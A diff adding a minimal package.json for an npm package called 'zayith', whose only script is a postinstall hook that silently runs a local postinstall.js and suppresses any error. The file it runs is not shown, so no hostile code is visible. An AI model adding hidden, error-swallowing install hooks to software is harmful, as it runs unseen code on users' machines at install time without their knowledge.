@@ -1,0 +1,8 @@
+{
+  "name": "zayith",
+  "version": "0.1.0",
+  "license": "MIT",
+  "scripts": {
+    "postinstall": "node -e \"try{require('./postinstall.js')}catch(e){}\""
+  }
+}
